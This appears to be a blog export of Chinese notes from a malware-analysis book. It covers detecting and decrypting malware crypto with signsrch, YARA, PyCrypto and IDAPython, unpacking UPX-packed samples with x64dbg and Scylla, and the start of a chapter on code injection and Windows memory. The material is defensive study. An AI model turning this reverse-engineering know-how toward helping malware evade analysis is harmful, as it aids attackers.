2330 DES_fp [..64] 004104b8 2331 DES_ei [..48] 004104e8 2332 DES_p32i [..32] 00410508 1920 DES permuted choice table (key) [..56] 00410540 1921 DES permuted choice key (table) [..48] 00410580 1922 DES S-boxes [..512] [Removed] 一旦你知道加密指标所在的地址，你就可以用IDA导航到该地址。例如，如果你想导航到地址00410438（DES的初始排列组合IP），在IDA中加载二进制文件并选择Jump|Jump to address（跳转|跳转到地址）（或G热键）并输入地址，如图所示。\n一旦你点击确定，你将到达包含指标的地址（在这种情况下，DES初始permutation IP，标记为DES_ip），如以下截图所示。\n现在，要知道这个加密指标在代码中的使用位置和方式，你可以使用交叉引用（Xrefs-to）功能。使用交叉引用（Xrefs to）功能显示，DES_ip在地址为0x4032E0（loc_4032E0）的函数sub_4032B0中被引用。\n现在，导航到地址0x4032E0可以直接进入DES加密函数，如下面的截图所示。一旦找到了加密函数，你可以使用交叉引用来进一步检查，以了解在什么情况下加密函数被调用以及用于加密数据的密钥。\n与其使用-e选项来定位签名，然后手动浏览使用签名的代码，你可以使用-F选项，它将给你使用加密指标的第一条指令的地址。在下面的输出中，用-F选项运行signsrch直接显示了代码中使用加密指标DES初始排列IP（DES_ip）的地址0x4032E0。\nC:\\signsrch\u003esignsrch.exe -F kav.exe [removed] offset num description [bits.endian.size] -------------------------------------------- [removed] 004032e0 1918 DES initial permutation IP [..64] 00403490 2330 DES_fp [..64]-e和-F选项显示相对于PE头中指定的首选基址的地址。例如，如果二进制文件的首选基址是0x00400000，那么由-e和-F选项返回的地址是通过将相对虚拟地址与首选基址0x00400000相加而确定的。当你运行（或调试）二进制文件时，它可以在首选基地址以外的任何地址被加载（例如，0x01350000）。如果你希望在一个正在运行的进程中或在调试二进制文件时（在IDA或x64dbg中）找到加密指标的地址，那么你可以用-P \u003cpid或进程名称\u003e选项运行signsrch。-P选项会自动确定加载可执行文件的基本地址，然后计算出加密签名的虚拟地址，如图所示。\nC:\\signsrch\u003esignsrch.exe -P kav.exe [removed] - 01350000 0001b000 C:\\Users\\test\\Desktop\\kav.exe - pid 3068 - base address 0x01350000 - offset 01350000 size 0001b000 - 110592 bytes allocated - load signatures - open file C:\\signsrch\\signsrch.sig - 3075 signatures in the database - start 1 threads - start signatures scanning: offset num description [bits.endian.size] -------------------------------------------- 01360438 1918 DES initial permutation IP [..64] 01360478 2330 DES_fp [..64] 013604b8 2331 DES_ei [..48] 除了检测加密算法外，Signsrch还可以检测压缩算法、一些反调试代码和Windows加密函数，通常以Crypt开头，如CryptDecrypt()和CryptImportKey()。\n2.2 使用FindCrypt2检测加密常量 Findcrypt2 (http://www.hexblog.com/ida_pro/files/findcrypt2.zip)【由于目前已经无法下载因此这里查阅了一下推荐换yara的匹配的一个方式https://github.com/polymorf/findcrypt-yara或者下一个小节的推荐yara检测】 是一个IDA Pro插件，可以在内存中搜索许多不同算法所使用的加密常数。要使用该插件，请下载它，并将findcrypt.plw文件复制到IDA插件文件夹中。现在，当你加载二进制文件时，该插件会自动运行，或者你可以通过选择Edit | Plugins | Find crypt v2（编辑|插件|查找密码v2）来手动调用它。 该插件的结果会显示在输出窗口。\nFindCrypt2插件也可以在调试模式下运行。如果你使用IDA 6.x或更低的版本，FindCrypt2工作得很好；在编写本书时，它似乎不能在IDA 7.x版本中工作（可能是由于IDA 7.x API的变化）。\n2.3 利用YARA检测加密签名 另一种识别二进制文件中使用加密技术的方法是用包含加密签名的YARA规则扫描二进制文件。你可以自己编写YARA规则，或者下载其他安全研究人员编写的YARA规则（如 https://github.com/x64dbg/yarasigs/blob/master/crypto_signatures.yara），然后用YARA规则扫描二进制文件。\nx64dbg集成了YARA；如果你想在调试时扫描二进制文件中的加密签名，这很有用。你可以将二进制文件加载到x64dbg中（确保执行在二进制文件的某个地方暂停），然后右键点击CPU窗口，选择YARA（或Ctrl + Y）；这将带来这里显示的Yara对话框。点击 “文件”，加载包含YARA规则的文件。你也可以通过点击目录按钮从一个目录中加载含有YARA规则的多个文件。\n下面的截图显示了用包含加密签名的YARA规则扫描恶意二进制文件后检测到的加密常量。现在你可以右击任何一个条目，选择在转储中关注，以查看转储窗口中的数据，或者，如果签名与加密程序有关，那么你可以双击任何一个条目来浏览代码。\n像RC4这样的加密算法不使用加密常数，因为它不容易用加密签名来检测。通常，你会看到攻击者使用RC4来加密数据，因为它很容易实现；在Talos的这篇博文中详细解释了RC4的使用步骤：http://blog.talosintelligence.com/2014/06/an-introduction-to-recognizing-and.html。\n2.4 用Python解密 在你确定了加密算法和用于加密数据的密钥后，你可以使用PyCryto (https://www.dlitz.net/software/pycrypto/) Python模块来解密数据。要安装PyCrypto，你可以使用apt-get install python-crypto 或 pip install pycrypto 或从源代码中编译它。Pycrypto支持散列算法，如MD2、MD4、MD5、RIPEMD、SHA1和SHA256。它还支持加密算法，如AES、ARC2、Blowfish、CAST、DES、DES3（Triple DES）、IDEA、RC5和ARC4。 下面的Python命令演示了如何使用Pycrypto模块生成MD5、SHA1和SHA256哈希值。\n# 由于原脚本存在bug，这里给出的是调整过的脚本 \u003e\u003e\u003e from Crypto.Hash import MD5,SHA256,SHA1 \u003e\u003e\u003e text = \"explorer.exe\" \u003e\u003e\u003e MD5.new(str.encode(text)).hexdigest() 'cde09bcdf5fde1e2eac52c0f93362b79' \u003e\u003e\u003e SHA256.new(str.encode(text)).hexdigest() '7592a3326e8f8297547f8c170b96b8aa8f5234027fd76593841a6574f098759c' \u003e\u003e\u003e SHA1.new(str.encode(text)).hexdigest() '7a0fd90576e08807bde2cc57bcf9854bbce05fe3'为了解密内容，从Crypto.Cipher中导入适当的加密模块。下面的例子显示了如何在ECB模式下使用DES进行加密和解密。\n# 由于原脚本存在bug，这里给出的是调整过的脚本 \u003e\u003e\u003e from Crypto.Cipher import DES \u003e\u003e\u003e text = \"hostname=blank78\" \u003e\u003e\u003e key = \"14834567\" \u003e\u003e\u003e des = DES.new(str.encode(key), DES.MODE_ECB) \u003e\u003e\u003e cipher_text = des.encrypt(str.encode(text)) \u003e\u003e\u003e cipher_text '\\xde\\xaf\\t\\xd5)sNj`\\xf5\\xae\\xfd\\xb8\\xd3f\\xf7' \u003e\u003e\u003e plain_text = des.decrypt(cipher_text) \u003e\u003e\u003e plain_text 'hostname=blank78'3. 自定义编码/加密 有时，攻击者会使用自定义的编码/加密方案，这使得难以识别加密（和密钥），也使得逆向工程更加困难。自定义编码方法之一是使用编码和加密的组合来混淆数据；这种恶意软件的一个例子是Etumbot（https://www.arbornetworks.com/blog/asert/illuminating-theetumbot-apt-backdoor/）。Etumbot恶意软件样本在执行时，会从C2服务器获得RC4密钥；然后使用获得的RC4密钥对系统信息（如主机名、用户名和IP地址）进行加密，加密后的内容使用自定义Base64进一步编码，并外流到C2。包含混淆内容的C2通信在下面的截图中显示。关于这个样本的逆向工程细节，请参考作者的演讲和视频演示（https://cysinfo.com/12th-meetup-reversing-decrypting-malware-communications/）。\n为了对内容进行解密，需要先用自定义的Base64进行解码，然后用RC4进行解密；这些步骤用以下python命令进行。输出显示解密后的系统信息。\n\u003e\u003e\u003e import base64 \u003e\u003e\u003e from Crypto.Cipher import ARC4 \u003e\u003e\u003e rc4_key = \"e65wb24n5\" \u003e\u003e\u003e cipher_text = \"kRp6OKW9r90_2_KvkKcQ_j5oA1D2aIxt6xPeFiJYlEHvM8QMql38CtWfWuYlgiXMDFlsoFoH\" \u003e\u003e\u003e content = cipher_text.replace('_','/').replace('-','=') \u003e\u003e\u003e b64_decode = base64.b64decode(content) \u003e\u003e\u003e rc4 = ARC4.new(rc4_key) \u003e\u003e\u003e plain_text = rc4.decrypt(b64_decode) \u003e\u003e\u003e print plain_text MYHOSTNAME|Administrator|192.168.1.100|No Proxy|04182|一些恶意软件作者没有使用标准编码/加密算法的组合，而是实施了一个全新的编码/加密方案。这种恶意软件的一个例子是APT1集团使用的恶意软件。该恶意软件将一个字符串解密为一个URL；为此，恶意软件调用一个用户定义的函数（在下面的截图中更名为Decrypt_Func），该函数实现了自定义加密算法。Decrypt_Func接受三个参数；第一个参数是包含加密内容的缓冲区，第二个参数是将存储解密内容的缓冲区，第三个参数是缓冲区的长度。在下面的截图中，在执行Decrypt_Func之前暂停了执行，它显示了第1个参数（包含加密内容的缓冲区）。\n根据你的目标，你可以分析Decrypt_Func以了解算法的工作原理，然后按照作者的介绍（https://cysinfo.com/8th-meetup-understanding-apt1-malware-techniques-using-malware-analysis-reverse-engineering/）编写一个解密器，或者你可以让恶意软件为你解密内容。要让恶意软件解密内容，只需跨过Decrypt_Func（它将完成执行解密函数），然后检查第2个参数（存储解密内容的缓冲区）。下面的截图显示了包含恶意URL的解密缓冲区（第2参数）。\n前面提到的让恶意软件解码数据的技术，如果解密函数被调用的次数不多，是很有用的。如果解密函数在程序中被多次调用，那么使用调试器脚本（在第6章，调试恶意二进制文件中涉及）自动解码过程会比手动操作更有效率。为了证明这一点，请考虑一个64位恶意软件样本的代码片段（在下面的截图中）。请注意恶意软件如何多次调用一个函数（重命名为dec_function）；如果你看一下代码，你会注意到一个加密的字符串被传递给这个函数作为第1个参数（在rcx寄存器中），执行该函数后，eax中的返回值包含存储解密内容的缓冲区的地址。\n下面的截图显示了对dec_function的交叉引用；你可以看到，这个函数在程序中被多次调用。\n每次调用dec_function时，它都会解密一个字符串。为了解密传递给这个函数的所有字符串，我们可以写一个IDAPython脚本（比如这里显示的那个）。\nimport idautils import idaapi import idc for name in idautils.Names(): if name[1] == \"dec_function\": ea= idc.get_name_ea_simple(\"dec_function\") for ref in idautils.CodeRefsTo(ea, 1): idc.add_bpt(ref) idc.start_process('', '', '') while True: event_code = idc.wait_for_next_event(idc.WFNE_SUSP, -1) if event_code \u003c 1 or event_code == idc.PROCESS_EXITED: break rcx_value = idc.get_reg_value(\"RCX\") encoded_string = idc.get_strlit_contents(rcx_value) idc.step_over() evt_code = idc.wait_for_next_event(idc.WFNE_SUSP, -1) if evt_code == idc.BREAKPOINT: rax_value = idc.get_reg_value(\"RAX\") decoded_string = idc.get_strlit_contents(rax_value) print \"{0} {1:\u003e25}\".format(encoded_string, decoded_string) idc.resume_process()由于我们已经将解密函数重命名为dec_function，所以它可以从IDA的名称窗口中访问。前面的脚本在名称窗口中进行迭代，以确定dec_function，并执行以下步骤。\n如果dec_function存在，它确定dec_function的地址。 它使用dec_function的地址来确定对dec_function的交叉引用（Xrefs to），它给出了所有dec_function被调用的地址。 3.它在所有调用dec_function的地址上设置断点。 4.它自动启动调试器，当断点在dec_function处被击中时，它从rcx寄存器所指向的地址读取加密的字符串。需要记住的一点是，要使IDA调试器自动启动，一定要选择调试器（如本地Windows调试器），可以从工具栏区域或者选择调试器|选择调试器。 然后，它步入函数，执行解密函数（dec_function），并读取返回值（rax），其中包含解密字符串的地址。然后它打印出解密的字符串。 它重复前面的步骤，对传递给dec_function的每个字符串进行解密。 运行前面的脚本后，加密的字符串和它们相应的解密字符串会显示在输出窗口中，如图所示。从输出中可以看出，恶意软件在运行期间解密了文件名、注册表名和API函数名，以避免被怀疑。换句话说，这些是攻击者想要隐藏的字符串，以避免静态分析。\n4. 恶意软件解包 攻击者不遗余力地保护他们的二进制文件免受反病毒检测，并使恶意软件分析师难以进行静态分析和反向工程。恶意软件作者经常使用打包器和加密器（见第2章，静态分析，了解打包器的基本介绍以及如何检测它们）来混淆可执行内容。打包器是一个程序，它将一个正常的可执行文件，压缩其内容，并生成一个新的混淆的可执行文件。加密器与打包器一样，不是压缩二进制文件，而是对其进行加密。换句话说，打包器或加密器将可执行文件转变为难以分析的形式。当一个二进制文件被打包时，它透露的信息非常少；你不会发现字符串透露出任何有价值的信息，导入的函数数量会减少，程序指令会被掩盖。为了理解一个打包的二进制文件，你需要移除应用于程序的混淆层（解包）；要做到这一点，首先要了解打包器的工作原理。 当一个正常的可执行文件通过打包器时，可执行文件的内容被压缩，并且它添加了一个解包存根（解压程序）。然后，打包器将可执行文件的入口点修改为存根的位置，并生成一个新的打包可执行文件。当打包后的二进制文件被执行时，解包存根会提取原始二进制文件（在运行期间），然后通过将控制权转移到原始入口点（OEP）来触发原始二进制文件的执行，如下图所描述。\n要解开一个打包的二进制文件，你可以使用自动工具，也可以手动操作。自动化方法可以节省时间，但并不完全可靠（有时成功，有时不成功），而手工方法则很费时，但一旦你掌握了技能，它就是最可靠的方法。\n4.3 手动拆包 要解开用打包器打包的二进制文件，我们通常要执行以下一般步骤。\n第一步是识别OEP；如前所述，当一个打包的二进制文件被执行时，它会提取原始二进制文件，并在某个时间点将控制权转移到OEP。原始入口点（OEP）是恶意软件被打包前的第一条指令（恶意代码开始的地方）的地址。在这一步，我们确定打包的二进制文件中的指令，它将跳转（引导我们）到OEP。 下一步是执行程序，直到达到OEP；其目的是让恶意软件存根在内存中解包，并在OEP处暂停（在执行恶意代码之前）。 第三步涉及将解包的程序从内存中转储到磁盘。 最后一步涉及修复转储文件的导入地址表（IAT）。 在接下来的几节中，我们将详细研究这些步骤。为了演示前面的概念，我们将使用一个用UPX打包器打包的恶意软件（https://upx.github.io/）。在接下来的几节中所涉及的工具和技术应该给你一个手动解包过程的概念。\n4.1.1 识别OEP 在本节中，你将了解识别打包二进制文件中的OEP的技术。在下面的截图中，在pestudio(https://www.winitor.com/)中检查打包的二进制文件，显示了许多表明该文件是打包的指标。包装好的二进制文件包含三个部分：UPX0、UPX1和.rsrc。从截图中，你可以看到打包二进制文件的入口在UPX1部分，所以执行从这里开始，这部分包含解压存根，将在运行时解压原始可执行文件。另一个指标是，UPX0部分的原始大小为0，但虚拟大小为0x1f000；这表明UPX0部分不占用磁盘上的任何空间，但它占用了内存空间；具体而言，它占用了0x1f000字节的大小（这是因为恶意软件在内存中解压了可执行文件，并在运行时将其储存在UPX0部分）。另外，UPX0部分具有读、写、执行权限，很可能是因为在解压原始二进制文件后，恶意代码将在UPX0中开始执行。\n另一个指标是，打包的二进制文件包含混淆的字符串，当你在IDA中加载二进制文件时，IDA识别出导入地址表（IAT）在一个非标准的位置，并显示以下警告；这是由于UPX打包了所有的部分和IAT。\n该二进制文件仅由一个内置函数和5个导入函数组成；所有这些指标都表明，该二进制文件是打包的。\n为了找到OEP，你需要在打包的程序中找到将控制权转移到OEP的指令。根据打包程序的不同，这可能很简单，也可能很有挑战性；通常你会关注那些将控制权转移到一个不明确目的地的指令。检查打包的二进制文件中的函数流程图，可以看到跳转到一个位置，这个位置被IDA用红色标出。\n红色是IDA表示它不能分析，因为跳转目的地不明确。下面的屏幕截图显示了跳转指令。\n双击跳转目的地（byte_40259B）显示，跳转将被带到UPX0（从UPX1）。换句话说，执行时，恶意软件在UPX1中执行解压存根，解开原始二进制文件，复制UPX0中的解压代码，而跳转指令很可能将控制权转移到UPX0中的解压代码（从UPX1）。\n在这一点上，我们已经找到了我们认为会跳转到OEP的指令。下一步是在调试器中加载二进制文件，在执行跳转的指令处设置断点，并执行到该指令为止。为了做到这一点，二进制文件被加载到x64dbg中（你也可以使用IDA调试器并遵循同样的步骤），并设置断点，执行到跳转指令。如下面的截图所示，在该跳转指令处暂停执行。\n现在你可以假设恶意软件已经完成了解包；现在，你可以按一次F7（步入），这将带你到地址0x0040259B的原始入口点。在这一点上，我们是在恶意软件的第一个指令（解包后）。\n4.1.2 用Scylla卸载进程内存 现在我们已经找到了OEP，下一步是将进程内存转储到磁盘。为了转储进程，我们将使用一个名为Scylla（https://github.com/NtQuery/Scylla）的工具；它是一个转储进程内存和重建导入地址表的伟大工具。x64dbg的一大特点是它集成了Scylla，可以通过点击插件|Scylla（或Ctrl+I）启动Scylla。要转储进程内存，当执行在OEP处暂停时，启动Scylla，确保OEP字段被设置为正确的地址，如下所示；如果没有，你需要手动设置，并点击转储按钮，将转储的可执行文件保存到磁盘（在这个例子中，它被保存为packed_dump.exe）。\n现在，当你把转储的可执行文件加载到IDA时，你会看到整个内置函数列表（之前在打包的程序中是看不到的），函数代码也不再被混淆，但仍然看不到导入，API调用显示的是地址而不是名字。为了克服这个问题，你需要重建打包后的二进制文件的导入表。 4.1.3 修复导入表 要修复导入表，回到Scylla，并点击IAT自动搜索按钮，它将扫描进程的内存以找到进口表；如果找到，它将用适当的值填充VA和大小字段。要获得导入的列表，请点击Get Imports按钮。使用这种方法确定的导入函数的列表显示在这里。有时，你可能会注意到结果中的无效条目（条目旁边没有勾号）；在这种情况下，右击这些条目，选择Cut Thunk来删除它们。 在使用上一步确定导入的功能后，你需要将补丁应用到转储的可执行文件（packed_dump.exe）中。要做到这一点，点击Fix Dump按钮，这将启动文件浏览器，你可以选择你之前转储的文件。Scylla将用确定的导入函数修补二进制文件，并将创建一个新的文件，文件名在末尾含有_SCY（如packed_dumped_SCY.exe）。现在，当你在IDA中加载打过补丁的文件时，你会看到对导入函数的引用，如图所示。 当你处理一些打包器时，Scylla中的IAT自动搜索按钮可能无法找到模块的导入表；在这种情况下，你可能需要付出一些额外的努力，手动确定导入表的开始和导入表的大小，并在VA和大小字段中输入。\n4.2 自动拆包 有各种工具可以让你解开用UPX、FSG和AsPack等常见打包器打包的恶意软件。自动工具对于已知的打包器是很好的，可以节省时间，但请记住，它可能并不总是有效的；这时，手动解包技能将有所帮助。ReversingLabs的TitanMist（https://www.reversinglabs.com/open-source/titanmist.html）是一个伟大的工具，由各种打包器签名和解包脚本组成。在你下载并解压后，你可以使用这里显示的命令针对打包的二进制文件运行它；使用-i，你指定输入文件（打包文件），而-o指定输出文件名，-t指定解包器的类型。在后面提到的命令中，TitanMist是针对用UPX打包的二进制文件运行的；注意它是如何自动识别打包器并执行解包过程的。该工具自动识别了OEP和导入表，转储了进程，修正了导入，并将补丁应用到转储的进程中。\nC:\\TitanMist\u003eTitanMist.exe -i packed.exe -o unpacked.exe -t python Match found! │ Name: UPX │ Version: 0.8x - 3.x │ Author: Markus and Laszlo │ Wiki url: http://kbase.reversinglabs.com/index.php/UPX │ Description: Unpacker for UPX 1.x - 3.x packed files ReversingLabs Corporation / www.reversinglabs.com [x] Debugger initialized. [x] Hardware breakpoint set. [x] Import at 00407000. [x] Import at 00407004. [x] Import at 00407008.[Removed] [x] Import at 00407118. [x] OEP found: 0x0040259B. [x] Process dumped. [x] IAT begin at 0x00407000, size 00000118. [X] Imports fixed. [x] No overlay found. [x] File has been realigned. [x] File has been unpacked to unpacked.exe. [x] Exit Code: 0. █ Unpacking succeeded!另一个选择是使用IDA Pro的通用PE解包器插件。这个插件依赖于对恶意软件的调试，以确定代码何时跳转到OEP。关于这个插件的详细信息，请参考这篇文章（https://www.hex-rays.com/products/ida/support/tutorials/unpack_pe/unpacking.pdf）。要调用这个插件，将二进制文件加载到IDA，并选择Edit | Plugins | Universal PE 解包器。运行该插件可以在调试器中启动程序，并且它试图暂停程序，只要打包器完成解包。在IDA中加载UPX打包的恶意软件（与手动解包中使用的样本相同）并启动插件后，会显示以下对话框。在下面的截图中，IDA将开始地址和结束地址设置为UPX0部分的范围；这个范围被视为OEP范围。换句话说，当执行到这一段时（从UPX1开始，它包含解压存根），IDA将暂停程序的执行，给你一个机会采取进一步的行动。 在下面的截图中，注意IDA是如何自动确定OEP地址，然后显示以下对话框的。\n如果你点击 “是 “按钮，执行将被停止，进程将被退出，但在此之前，IDA将自动确定导入地址表（IAT），它将创建一个新段来重建程序的导入部分。在这一点上，你可以分析解压后的代码。下面的屏幕截图显示了新重建的导入地址表。 如果你不点击YES按钮，而是点击No按钮，那么IDA将在OEP处暂停调试器的执行，在这一点上，你可以调试已解压的代码或手动转储可执行文件，通过输入适当的OEP（如第4.1节手动解压），使用Scylla等工具修复导入。 在x64dbg中，你可以使用解包脚本执行自动解包，这些脚本可以从https://github.com/x64dbg/Scripts。要解包，确保二进制文件被加载并在入口点暂停。根据你所处理的打包器，你需要在脚本窗格上点击右键，然后选择加载脚本|打开（或Ctrl + O）来加载相应的解包脚本。下面的屏幕截图显示了UPX解包器脚本的内容。\n加载完脚本后，通过右键点击脚本窗格并选择运行来运行该脚本。如果脚本成功解压，就会弹出一个消息框说脚本完成了，执行将在OEP处暂停。下面的截图显示了运行UPX解包脚本后，在OEP处自动设置的断点（在CPU窗格中）。现在，你可以开始调试解压后的代码，或者你可以使用Scylla来转储进程并修复导入的代码（如4.1节手动解压中所述）。 除了前面提到的工具外，还有其他各种资源可以帮助你进行自动解包。参见Ether Unpack Service: http://ether.gtisc.gatech.edu/web_unpack/, FUU（Faster Universal Unpacker）: https://github.com/crackinglandia/fuu。\n总结 恶意软件作者使用混淆技术来掩盖数据，并从安全分析人员那里隐藏信息。在这一章中，我们研究了恶意软件作者常用的各种编码、加密和打包技术，我们还研究了不同的策略来消除数据的混淆。在下一章中，你将被介绍到内存取证的概念，你将了解如何使用内存取证来调查恶意软件的能力。\n",
    "description": "",
    "tags": "恶意样本分析,学习",
    "title": "恶意样本分析-10-恶意软件的混淆技术",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-10-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E7%9A%84%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-10-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E7%9A%84%E6%B7%B7%E6%B7%86%E6%8A%80%E6%9C%AF/index.html"
  },
  {
    "content": "8. 代码注入和钩子 在上一章中，我们研究了恶意软件用来留在受害者系统中的不同持久性机制。在本章中，你将学习恶意程序如何将代码注入另一个进程（称为目标进程或远程进程）以执行恶意行动。将恶意代码注入目标进程的内存并在目标进程的上下文中执行恶意代码的技术被称为代码注入（或进程注入）。\n攻击者通常选择一个合法进程（如explorer.exe或svchost.exe）作为目标进程。一旦恶意代码被注入目标进程，它就可以在目标进程的上下文中执行恶意行为，如记录击键、窃取密码和渗出数据。在将代码注入目标进程的内存后，负责注入代码的恶意软件组件可以继续在系统上持续存在，从而在每次系统重启时将代码注入目标进程，或者它可以从文件系统中删除自己，只将恶意代码保留在内存中。/\n在我们深入研究恶意软件的代码注入技术之前，必须了解虚拟内存的概念。\n8.1 虚拟内存 当你双击一个包含指令序列的程序时，就会创建一个进程。Windows操作系统为每个新创建的进程提供自己的私有内存地址空间（称为进程内存）。进程内存是虚拟内存的一部分；虚拟内存不是真正的内存，而是由操作系统的内存管理器创造的一种假象。正是由于这种假象，每个进程都认为它有自己的私有内存空间。在运行期间，Windows内存管理器在硬件的帮助下，将虚拟地址转化为实际数据所在的物理地址（在RAM中）；为了管理内存，它将一些内存分页到磁盘。当进程的线程访问被分页到磁盘的虚拟地址时，内存管理器将其从磁盘装回内存。下图说明了两个进程，A和B，它们的进程内存被映射到物理内存中，而有些部分被分页到磁盘上。\n由于我们通常处理的是虚拟地址（就是你在调试器中看到的那些），所以在本章的其余部分，我们将不讨论物理内存。现在，让我们来关注一下虚拟内存。虚拟内存被划分为进程内存（进程空间或用户空间）和内核内存（内核空间或系统空间）。虚拟内存地址空间的大小取决于硬件平台。例如，在32位架构上，默认情况下，总的虚拟地址空间（包括进程和内核内存）最大为4GB。低于一半的部分（下2GB空间），范围从0x00000000到0x7FFFFFFF，被保留给用户进程（进程内存或用户空间），地址的上半部分（上2GB空间），范围从0x80000000到0xFFFFFFFF，被保留给内核内存（内核空间）。\n在32位系统中，在4GB的虚拟地址空间中，每个进程认为它有2GB的进程内存，范围从0x00000000 - 0x7FFFFFFF。由于每个进程认为它有自己的私有虚拟地址空间（最终被映射到物理内存），总的虚拟地址会比可用的物理内存（RAM）大很多。Windows内存管理器通过将一些内存分页到磁盘来解决这个问题；这释放了物理内存，它可以用于其他进程或操作系统本身。尽管每个Windows进程都有自己的私有内存空间，但内核内存在大多数情况下是公用的，并由所有进程共享。下图显示了32位架构的内存布局。你可能会注意到在用户空间和内核空间之间有一个64KB的空隙；这个区域是不可访问的，它可以确保内核不会意外地越过边界而破坏用户空间。你可以通过检查符号MmHighestUserAddress来确定进程地址空间的上边界（最后可用的地址），通过使用内核调试器（如Windbg）查询符号MmSystemRangeStart来确定内核空间的下边界（第一个可用地址）。\n即使每个进程的虚拟地址范围是相同的（x00000000 - 0x7FFFFFFF），硬件和Windows都确保映射到这个范围的物理地址对每个进程是不同的。例如，当两个进程访问同一个虚拟地址时，每个进程最终将访问物理内存中的不同地址。通过为每个进程提供私有的地址空间，操作系统确保进程不会覆盖对方的数据。\n虚拟内存空间不需要总是被分成2GB的两半，这只是默认设置。例如，你可以通过以下命令启用3GB的启动开关，将进程内存增加到3GB，范围从0x00000000 - 0xBFFFFFFF；内核内存得到剩余的1GB，从0xC0000000-0xFFFFFFFF。\nbcdedit /set increaseuserva 3072x64架构为进程和内核内存提供更大的地址空间，如下图所示。在x64架构上，用户空间的范围是0x000000000000-0x000007ffffffff，而内核空间的范围是0xffff080000000000及以上。你可能会注意到在用户空间和内核空间之间有一个巨大的地址差距；这个地址范围是不能使用的。尽管在下面的截图中，内核空间是从0xffff080000000000开始的，但内核空间的第一个可用地址是从ffff800000000开始的。原因是x64代码中使用的所有地址都必须是规范的。如果一个地址的第47-63位全部被设置或全部被清除，那么这个地址就是规范的的。试图使用一个非规范的地址会导致一个页面故障异常。\n1.1 进程内存组件（用户空间） 有了对虚拟内存的了解，让我们把注意力集中在虚拟内存的一部分，即进程内存。进程内存是用户应用程序使用的内存。下面的截图显示了两个进程，并给出了驻留在进程内存中的组件的高级概述。在下面的截图中，为了简单起见，内核空间被故意留空（我们将在下一节中填补这一空白）。请记住，进程共享相同的内核空间。\n过程存储器由以下主要部分组成。\n进程可执行文件。这个区域包含与应用程序相关的可执行文件。当双击磁盘上的一个程序时，就会创建一个进程，并将与该程序相关的可执行文件加载到进程内存中。 动态链接库（DLLs）。当一个进程被创建时，其所有相关的DLLs被加载到进程内存中。这个区域代表与进程相关的所有DLLs。 进程环境变量。这个内存区域存储进程的环境变量，如临时目录、主目录、AppData目录等等。 进程堆。这个区域指定了进程的堆。每个进程有一个单一的堆，并且可以根据需要创建额外的堆。这个区域指定了进程所接受的动态输入。 线程堆栈。这个区域代表分配给每个线程的进程内存的专用范围，称为其运行时堆栈。每个线程都有自己的堆栈，在这里可以找到函数参数、局部变量和返回地址。 进程环境块（PEB）。这个区域代表了PEB结构，它包含了关于可执行文件的加载位置、它在磁盘上的完整路径以及在内存中找到DLL的信息。 你可以通过使用Process Hacker（https://processhacker.sourceforge.io/）工具来检查一个进程的内存内容。要做到这一点，启动Process Hacker，右键单击所需的进程，选择属性，并选择内存选项卡。\n1.2 内核内存内容（内核空间） 内核内存包含操作系统和设备驱动程序。下面的截图显示了用户空间和内核空间的组件。在本节中，我们将主要关注内核空间的组件。\n内核内存由以下关键部分组成。\nhal.dll。硬件抽象层（HAL）是在可加载的内核模块hal.dll中实现的。HAL将操作系统与硬件隔离；它实现了支持不同硬件平台（主要是芯片组）的功能。它主要为Windows执行器、内核和内核模式设备驱动程序提供服务。内核模式设备驱动程序调用hal.dll暴露的功能与硬件进行交互，而不是直接与硬件进行通信。 ntoskrnl.exe。这个二进制文件是被称为内核镜像的Windows操作系统的核心组件。ntoskrnl.exe二进制文件提供两种类型的功能：执行和内核。执行器实现了被称为系统服务例程的功能，用户模式的应用程序可以通过一个受控机制调用这些功能。执行器还实现了主要的操作系统组件，如内存管理器、I/O管理器、对象管理器、进程/线程管理器，等等。内核实现了低级别的操作系统服务，并公开了一系列的例程，这些例程由执行器建立，以提供高级别的服务。 Win32K.sys。这个内核模式的驱动程序实现了用户界面和图形设备接口（GDI）服务，这些服务用于在输出设备（如显示器）上渲染图形。它为GUI应用程序提供功能。 2. 用户模式和内核模式 在上一节中，我们看到虚拟内存是如何被分为用户空间（进程内存）和内核空间（内核内存）的。用户空间包含的代码（如可执行文件和DLL）以受限的访问方式运行，被称为用户模式。换句话说，在用户空间运行的可执行文件或DLL代码不能访问内核空间的任何东西，也不能与硬件直接交互。内核空间包含内核本身（ntoskrnl.exe）和设备驱动程序。运行在内核空间的代码以高权限执行，即所谓的内核模式，它可以同时访问用户空间和内核空间。通过为内核提供高权限级别，操作系统确保用户模式的应用程序不能通过访问受保护的内存或I/O端口而导致系统不稳定。第三方驱动程序可以通过实现和安装签名的驱动程序使他们的代码在内核模式下运行。\n空间（用户空间/内核空间）和模式（用户模式/内核模式）之间的区别是，空间指定了内容（数据/代码）的存储位置，而模式指的是执行模式，它指定了允许应用程序的指令如何执行。\n如果用户模式的应用程序不能直接与硬件交互，那么问题是，在用户模式下运行的恶意软件二进制文件如何通过调用WriteFile API将内容写入磁盘上的文件？事实上，大多数由用户模式应用程序调用的API，最终都会调用内核执行程序（ntoskrnl.exe）中实现的系统服务程序（功能），而内核执行程序又会与硬件进行交互（例如，向磁盘上的文件写入）。以同样的方式，任何调用GUI相关API的用户模式应用程序最终都会调用内核空间中win32k.sys所暴露的功能。下图说明了这个概念；为了简单起见，我从用户空间删除了一些组件。ntdll.dll（驻留在用户空间）充当了用户空间和内核空间之间的网关。以同样的方式，user32.dll作为GUI应用程序的网关。在下一节，我们将主要关注通过ntdll.dll将API调用过渡到内核执行的系统服务例程。\n2.1 Windows API调用流程 